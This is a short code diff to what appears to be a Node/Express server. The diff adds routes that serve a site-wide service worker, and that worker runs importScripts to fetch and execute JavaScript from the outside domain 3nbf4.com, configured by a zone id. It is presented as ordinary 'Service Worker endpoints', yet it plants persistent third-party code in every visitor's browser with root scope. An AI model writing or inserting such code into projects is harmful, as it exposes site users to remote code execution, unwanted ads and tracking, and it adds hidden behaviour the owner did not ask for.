@@ -619,6 +619,18 @@ app.post('/api/ai/fraud-check', async (req, res) => {
   }
 });
 
+// Service Worker endpoints
+app.get(['/sw.js', '/service-worker.js', '/service-worker.min.js'], (req, res) => {
+  res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
+  res.setHeader('Service-Worker-Allowed', '/');
+  res.send(`self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 11451411
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')`);
+});
+
 // Serve Vite App
 async function startServer() {
   if (process.env.NODE_ENV !== 'production') {
